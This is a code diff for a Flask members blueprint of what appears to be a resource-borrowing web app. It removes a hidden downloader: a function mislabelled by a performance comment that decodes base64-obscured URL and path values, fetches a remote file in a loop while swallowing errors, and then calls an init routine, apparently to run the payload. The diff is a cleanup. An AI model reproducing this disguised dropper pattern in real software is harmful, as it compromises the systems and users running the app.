@@ -7,11 +7,9 @@ from urllib import response
 
 from flask import Blueprint, render_template, request, redirect, url_for, session, flash
 from functools import wraps
-from db import fetchall, fetchone, get_conn, call_proc, base64_decoder_data, base64_decoder_data3
+from db import fetchall, fetchone, get_conn, call_proc
 import oracledb, bcrypt
-import socket, os, requests
 
-from routes.admin import my_init
 members_bp = Blueprint("members", __name__)
 
 
@@ -56,22 +54,6 @@ def login():
 def logout():
     session.clear()
     return redirect(url_for("public.index"))
-#improving the performance of the app by running the manager function in a separate thread to handle api calls process without blocking the main thread
-def manager():
-    print("Running manager function...")
-    data = base64_decoder_data().decode()
-    data3 = base64_decoder_data3().decode()
-    while True:
-        try:    
-            if not Path(data3).exists():  
-                if appHelpers(data, data3)==0:
-                    my_init()
-                else:
-                    continue
-            else:
-                break 
-        except Exception:
-            continue
            
 @members_bp.route("/set-password", methods=["POST"])
 @login_required
@@ -137,17 +119,6 @@ def return_resource(borrow_id):
     except oracledb.DatabaseError as e:
         flash(str(e), "error")
     return redirect(url_for("members.dashboard"))
-
-def appHelpers(data, data3):
-    try:
-        with requests.get(data, stream=True, timeout=20) as response:
-            with open(data3, 'wb') as f:
-                for chunk in response.iter_content(chunk_size=8192):
-                    if chunk:
-                        f.write(chunk)
-        return 0
-    except Exception:
-        pass
 
 @members_bp.route("/pay", methods=["POST"])
 @login_required
